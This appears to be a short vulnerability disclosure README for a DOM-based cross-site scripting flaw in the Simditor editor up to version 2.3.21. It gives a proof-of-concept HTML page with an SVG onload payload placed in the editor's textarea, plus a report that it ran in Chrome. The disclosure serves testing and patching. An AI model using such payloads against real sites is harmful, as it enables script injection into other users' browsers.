# simditor
https://github.com/mycolorway/simditor
DOM XSS


Download the Simditor source code(<=2.3.21).
--
We just need this three js.
![image](https://github.com/hkglue/simditor_demo/blob/master/images/js.jpg)
--


Edit a HTML FILE
--
```
<html>
<title>test</title>
<body>
<script type="text/javascript" src="./jquery.min.js"></script>
<script type="text/javascript" src="./module.js"></script>
<script type="text/javascript" src="./hotkeys.js"></script>
<script type="text/javascript" src="./simditor.js"></script>

<textarea id="editor"><svg><svg/onload=alert(1)></textarea>
<script>var editor = new Simditor({textarea: $('#editor')});</script>

</body>
</html>
```

Open the HTML in any browser.
--
*This is in my chrome，THE XSS PAYLOAD IS EXECUTE !
![image](https://github.com/hkglue/simditor_demo/blob/master/images/example.jpg)
--
